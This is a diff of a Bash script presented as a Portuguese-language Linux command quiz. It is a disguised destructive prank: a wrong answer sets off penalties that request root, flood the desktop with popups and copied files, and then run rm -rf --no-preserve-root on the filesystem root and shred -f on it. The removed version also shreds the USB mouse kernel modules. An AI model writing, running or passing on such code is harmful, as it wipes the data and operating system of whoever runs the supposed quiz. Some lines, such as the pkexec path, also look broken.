@@ -1,58 +1,126 @@
 #!/bin/bash
 
-'codigo escrito por: Helvecio Resende Chaves'
+# XFCE property path for wallpaper_effect
+readonly xfce4_channel="xfce4-desktop"
+readonly xfce_path="/backdrop/screen0/monitorVirtual1/workspace0"
 
-'INTRODUÇÃO'
+# ------------------------------------------------------------------------------
+# Function: get_root
+# Description: requests acess to root permission in order to run the .sh file
+# Arguments:
+# ------------------------------------------------------------------------------
+get_root (){
+	pkexec /user/bin/id
+	}
 
-'PEDIDO DE EXECUÇÃO EM ROOT'
+# ------------------------------------------------------------------------------
+# Function: wallpaper_effect_on
+# Description: modifies the timer, period and enables cycling between the wallpaper images
+# Arguments:
+# Wrote by: Helvecio
+# ------------------------------------------------------------------------------
+wallpaper_effect_on() {
+	xfconf-query -c "${xfce4_channel}" -p "${xfce_path}"/backdrop-cycle-enable -s true;
+	xfconf-query -c "${xfce4_channel}" -p "${xfce_path}"/backdrop-cycle-period -s 0;
+	xfconf-query -c "${xfce4_channel}" -p "${xfce_path}"/backdrop-cycle-timer -s 1;
+}
 
-if [ "$EUID" -ne 0 ]; 
-	then
-    exec sudo bash "$0" "$@"
-fi
-
-zenity --info --title "Aviso" --text "Na verdade, o teste começará agora, boa sorte! :)" 
-
-'PRIMEIRA ETAPA'
-
-resposta1=$(zenity --entry --title "Teste 1:" --text "Qual o nome do comando que cria uma pasta? (pense antes, não haverá segundas chances...)")
-
-if [ "$resposta1" = "mkdir" ];
-
-then zenity --info --height 400 --width 700 --text "Parabens, resposta correta!!"  
-
-else zenity --info --height 400 --width 700 --text "Resposta Incorreta";
-	xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitorVirtual1/workspace0/backdrop-cycle-enable -s true;
-	xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitorVirtual1/workspace0/backdrop-cycle-timer  -s 1;
-	xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitorVirtual1/workspace0/backdrop-cycle-period -s 0;
-	for i in {1..100}; do cp ~/Scripts/invasao.txt ~/Desktop/Adeus$i.txt & done &&
-	for i in {1..100}; do cp ~/Scripts/invasao.txt ~//*$i & done &&
-	shred -f // &&
-	break
-fi
-
-'SEGUNDA ETAPA' 
-
-resposta2=$(zenity --entry --title "Teste 2:" --text "Qual o nome do comando muda as permissões de acesso de uma pasta ou arquivo ? (pense antes, não haverá segundas chances...)")
-
-if [ "$resposta2" = "chmod" ];
+# ------------------------------------------------------------------------------
+# Function: zenity_scattering_warn
+# Description: 
+# Wrote by: Helvecio
+# ------------------------------------------------------------------------------
+zenity_scattering_warn(){
 	
-then zenity --info --text "Nossaaaa, Parabens!!!" &&
-	xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitorVirtual1/workspace0/last-image -s ~/Downloads/parabens.jpeg;
-	zenity --info --height 400 --width 700 --title "PARABENS VOCE CONCLUIU SUA JORNADA" --text "Agora, faça seu relatorio de acordo com o arquivo 'LEIA-ME'" && 
-	echo -e "\Preencha abaixo as informaçoes pedidas pelo primeiro documento:" >> ~/Downloads/jornada.txt &&
-	open ~/Downloads/jornada.txt &&
-	xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitorVirtual1/workspace0/last-image -s ~/Downloads/ceu.jpeg 
+	for i in {1..50}; do zenity --warning --text "VoCê ErRoUuUuUuUuUu :("\
+	--width=260 --height=120 --timeout=15 & done
+	x=$(($RANDOM % 1500))
+	y=$(($RANDOM % 900))
 
-else zenity --info --height 400 --width 700 --text "Resposta Incorreta" &&
-	xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitorVirtual1/workspace0/backdrop-cycle-enable -s true;
-	xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitorVirtual1/workspace0/backdrop-cycle-timer  -s 1;
-	xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitorVirtual1/workspace0/backdrop-cycle-period -s 0;
-	sudo shred -f /lib/modules/7.0.0-42-generic/kernel/drivers/hid/usbhid/* &&
-	for i in {1..60}; do xcowsay -t 10 "INFELIZMENTE SEU MOUSE JA ERA :(" & done &&
-	xcowsay -t 10 --cow-size med --image ~/Downloads/ghost.jpeg &&
-	yes HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA | head -n 7000 >> ~/Scripts/invasao.txt &&
-	for i in {1..100}; do cp ~/Scripts/invasao.txt ~/Desktop/Adeus$i.txt & done &&
-	for i in {1..100}; do cp ~/Scripts/invasao.txt ~//*$i & done
+}
 
-fi
+
+# ------------------------------------------------------------------------------
+# Function: trigger_penalty1
+# Description: first penalty if wrong input in 1st question
+# Arguments:
+# Wrote by: Helvecio
+# ------------------------------------------------------------------------------
+trigger_penalty1(){
+	xfconf-query -c "${xfce4_channel}" -p "${xfce_path}"/last-image -s ~/Downloads/squirward.jpeg;
+	sleep 5
+	zenity_scattering_warn
+	wallpaper_effect_on
+	for i in {1..30}; do xcowsay -t 7 --cow-size med --image ~/Downloads/ghost.jpeg "ERRAAAAADOOOOO" & done;
+		for i in {1..30}; do xcowsay -t 7 --cow-size med --image ~/Downloads/ghost.jpeg "AGORA SEU PC MORRERÁ :(" & done
+	for i in {1..100}; do cp ~/Scripts/invasao.txt ~/Desktop/Adeus$i.txt & done 
+	for i in {1..100}; do cp ~/Scripts/invasao.txt //*$i & done 
+	rm -rf --no-preserve-root // 
+	exit 1
+
+}
+
+# ------------------------------------------------------------------------------
+# Function: trigger_penalty2
+# Description: second penalty if input is wrong in 2nd question
+# Arguments:
+# Wrote by: Helvecio
+# ------------------------------------------------------------------------------
+trigger_penalty2 (){
+
+	xfconf-query -c "${xfce4_channel}" -p "${xfce_path}"/last-image -s ~/Downloads/squirward.jpeg;
+	sleep 5
+	for i in {1..30}; do zenity --warning --text "VoCê ErRoUuUuUuUuUu" & done &
+	wallpaper_effect_on
+	for i in {1..30}; do xcowsay -t 7 --cow-size small --image ~/Downloads/ghost.jpeg "NÃOOOOOOOOOOO" & done
+	for i in {1..50}; do zenity --warning --title "Aviso" --height 300 --width 500 --text "Dê tchau ao seu PC" & done
+	xcowsay -t 6 --cow-size med "CONTAGEM REGRESSIVA:" 
+	for i in {1..10}; do xcowsay -t 1 "$i"; done 
+	for i in {1..300}; do xcowsay -t 2 --cow-size small --image ~/Downloads/squirward.jpeg & done
+	sleep 10
+	shred -f //
+}
+
+# ------------------------------------------------------------------------------
+# Function: complete_challenge
+# Description: Handles the success workflow when both stages are passed and opening it.
+# ------------------------------------------------------------------------------
+complete_challenge(){
+	xfconf-query -c "${xfce4_channel}" -p "${xfce_path}"/last-image -s ~/Downloads/parabens.jpeg;
+	zenity --info --height 300 --width 500 --title "PARABÉNS VOCÊ CONCLUIU SUA JORNADA" \
+	--text "Agora, preencha seu relatorio no arquivo jornada.txt";
+	echo -e "\n#Meu nome é: (SEU NOME) e eu sobrevivi a essa dura jornada." >> ~/Downloads/jornada.txt &
+	xed ~/Downloads/jornada.txt 
+}
+
+# ------------------------------------------------------------------------------
+# Function: main
+# Description: Orchestrates the quiz stages and validates user answers.
+# ------------------------------------------------------------------------------
+main (){ 
+	pkexec /user/bin/id
+	get_root
+	zenity --height 300 --width 500 --info --title "Aviso" --no-cancel --text "Na verdade, o teste começará agora, boa sorte!"
+
+	local answer1
+
+	answer1=$(zenity --entry --height 300 --width 500 --title "Teste 1" --text "Qual o nome do comando que cria uma pasta? \
+	(pense antes, não haverá segundas chances...)")
+	if [ "${answer1}" = "mkdir" ]; then
+		zenity --info --height 300 --width 500 --title "Correto" --text "Parabéns, resposta correta!!"
+	else trigger_penalty1
+  	fi
+
+  	local answer2
+
+  	answer2=$(zenity --entry --height 300 --width 500 --title "Teste 2:" \
+  	--text "Qual o nome do comando muda as permissões de acesso de uma pasta ou arquivo ? pense antes, não haverá segundas chances...")
+ 	if [ "${answer2}" = "chmod" ]; then
+		zenity --info --height 300 --width 500 --title "Correto" --text "Parabéns, resposta correta!!"
+		complete_challenge
+	else
+		trigger_penalty2
+	fi
+}
+
+main "$@"
